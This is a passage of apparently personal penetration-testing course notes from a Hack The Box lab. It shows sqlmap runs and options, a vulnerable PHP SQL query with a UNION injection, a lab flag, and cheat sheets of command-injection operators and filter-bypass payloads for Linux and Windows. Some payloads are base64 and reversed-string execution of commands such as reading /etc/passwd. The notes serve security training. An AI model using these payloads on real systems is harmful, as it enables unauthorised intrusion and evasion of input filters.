    "id": "1",
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example",
      "created": "2020-05-22T14:56:29.000Z",
      "updated": "2020-05-22T14:56:28.000Z"
    },
    "relationships": {
      "author": {
        "data": {"id": "42", "type": "user"}
      }
    }
  }]
}
```
```bash
s3curityguy@htb[/htb]$ sqlmap -r req.txt
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.9}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 00:03:44 /2020-09-15/

[00:03:44] [INFO] parsing HTTP request from 'req.txt'
JSON data found in HTTP body. Do you want to process it? [Y/n/q] 
[00:03:45] [INFO] testing connection to the target URL
[00:03:45] [INFO] testing if the target URL content is stable
[00:03:46] [INFO] testing if HTTP parameter 'JSON type' is dynamic
[00:03:46] [WARNING] HTTP parameter 'JSON type' does not appear to be dynamic
[00:03:46] [WARNING] heuristic (basic) test shows that HTTP parameter 'JSON type' might not be injectable
```

### HANDLING SQLMAP ERRORS:

>The first step is usually to switch the --parse-errors, to parse the DBMS errors (if any) and displays them as part of the program run:

>The -t option stores the whole traffic content to an output file:
```bash
s3curityguy@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt

s3curityguy@htb[/htb]$ cat /tmp/traffic.txt
HTTP request [#1]:
GET /?id=1 HTTP/1.1
Host: www.example.com
Cache-control: no-cache
Accept-encoding: gzip,deflate
Accept: */*
User-agent: sqlmap/1.4.9 (http://sqlmap.org)
Connection: close

HTTP response [#1] (200 OK):
Date: Thu, 24 Sep 2020 14:12:50 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 914
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://www.example.com:80/?id=1

<!DOCTYPE html>
<html lang="en">
...SNIP...
```

> As we can see from the above output, the /tmp/traffic.txt file now contains all sent and received HTTP requests. So, we can now manually investigate these requests to see where the issue is occurring.

>Another useful flag is the -v option, which raises the verbosity level of the console output As we can see, the -v 6 option will directly print all errors and full HTTP request to the terminal so that we can follow along with everything SQLMap is doing in real-time.

>finally, we can utilize the --proxy option to redirect the whole traffic through a (MiTM) proxy (e.g., Burp). This will route all SQLMap traffic through Burp, so that we can later manually investigate all requests, repeat them, and utilize all features of Burp with these requests:

### Prefix/Suffix

There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.
For such runs, options --prefix and --suffix can be used as follows:
Code: bash
```sql
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```
This will result in an enclosure of all vector values between the static prefix %')) and the suffix -- -.
For example, if the vulnerable code at the target is:
Code: php
```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```
The vector UNION ALL SELECT 1,2,VERSION(), bounded with the prefix %')) and the suffix -- -, will result in the following (valid) SQL statement at the target:
Code: sql
```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

For such demands, the options --level and --risk should be used:

    The option --level (1-5, default 1) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).

    The option --risk (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).

> We can use -v option to check what payloads are being used in different levels.

#### Techniques:
In some special cases, we have to narrow down the used payloads only to a certain type. For example, if the time-based blind payloads are causing trouble in the form of response timeouts, or if we want to force the usage of a specific SQLi payload type, the option --technique can specify the SQLi technique to be used.

For example, if we want to skip the time-based blind and stacking SQLi payloads and only test for the boolean-based blind, error-based, and UNION-query payloads, we can specify these techniques with --technique=BEU.

Flag5:HTB{8l0_much_r15k_bu7_w0r7h_17} Showing incorrect.


# COMMAND INJECTION:
## Injection Operators

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
|-|-|-|-|
|Semicolon| `;`|`%3b`|Both|
|New Line| `\n`|`%0a`|Both|
|Background| `&`|`%26`|Both (second output generally shown first)|
|Pipe| `\|`|`%7c`|Both (only second output is shown)|
|AND| `&&`|`%26%26`|Both (only if first succeeds)|
|OR| `\|\|`|`%7c%7c`|Second (only if first fails)|
|Sub-Shell| ` `` `|`%60%60`|Both (Linux-only)|
|Sub-Shell| `$()`|`%24%28%29`|Both (Linux-only)|

---
# Linux

## Filtered Character Bypass

| Code | Description |
| ----- | ----- |
| `printenv` | Can be used to view all environment variables |
| **Spaces** |
| `%09` | Using tabs instead of spaces |
| `${IFS}` | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`) |
| `{ls,-la}` | Commas will be replaced with spaces |
| **Other Characters** |
| `${PATH:0:1}` | Will be replaced with `/` |
| `${LS_COLORS:10:1}` | Will be replaced with `;` |
| `$(tr '!-}' '"-~'<<<[)` | Shift character by one (`[` -> `\`) |

---
## Blacklisted Command Bypass

| Code | Description |
| ----- | ----- |
| **Character Insertion** |
| `'` or `"` | Total must be even |
| `$@` or `\` | Linux only |
| **Case Manipulation** |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | Execute command regardless of cases |
| `$(a="WhOaMi";printf %s "${a,,}")` | Another variation of the technique |
| **Reversed Commands** |
| `echo 'whoami' \| rev` | Reverse a string |
| `$(rev<<<'imaohw')` | Execute reversed command |
| **Encoded Commands** |
| `echo -n 'cat /etc/passwd \| grep 33' \| base64` | Encode a string with base64 |
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute b64 encoded string |

---
# Windows

## Filtered Character Bypass

| Code | Description |
| ----- | ----- |
| `Get-ChildItem Env:` | Can be used to view all environment variables - (PowerShell) |
| **Spaces** |
| `%09` | Using tabs instead of spaces |
| `%PROGRAMFILES:~10,-5%` | Will be replaced with a space - (CMD) |
| `$env:PROGRAMFILES[10]` | Will be replaced with a space - (PowerShell) |
| **Other Characters** |
| `%HOMEPATH:~0,-17%` | Will be replaced with `\` - (CMD) |
| `$env:HOMEPATH[0]` | Will be replaced with `\` - (PowerShell) |

---
## Blacklisted Command Bypass

| Code | Description |
| ----- | ----- |
| **Character Insertion** |
| `'` or `"` | Total must be even |
| `^` | Windows only (CMD) |
| **Case Manipulation** |
| `WhoAmi` | Simply send the character with odd cases |
| **Reversed Commands** |
| `"whoami"[-1..-20] -join ''` | Reverse a string |
| `iex "$('imaohw'[-1..-20] -join '')"` | Execute reversed command |
| **Encoded Commands** |
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` | Encode a string with base64 |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string |



